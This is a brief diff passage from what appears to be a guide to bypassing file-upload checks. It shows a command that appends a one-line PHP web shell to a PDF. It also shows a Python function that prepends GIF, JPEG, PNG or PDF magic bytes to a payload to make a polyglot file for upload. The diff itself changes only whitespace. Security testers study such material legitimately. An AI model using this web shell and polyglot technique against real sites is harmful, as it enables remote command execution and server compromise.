@@ -94,14 +94,14 @@ echo '<?php system($_GET["cmd"]); ?>' >> polyglot.pdf
 ```python
 def create_polyglot_file(file_type: str, payload: str) -> bytes:
     """Create polyglot file with magic bytes and payload"""
-    
+
     magic_bytes = {
         'gif': b'\x47\x49\x46\x38\x39\x61',  # GIF89a
         'jpeg': b'\xFF\xD8\xFF\xE0',          # JPEG SOI + APP0
         'png': b'\x89PNG\r\n\x1a\n',          # PNG signature
         'pdf': b'%PDF-1.4\n'                  # PDF header
     }
-    
+
     return magic_bytes.get(file_type, b'') + payload.encode()
 
 # Create and upload polyglot
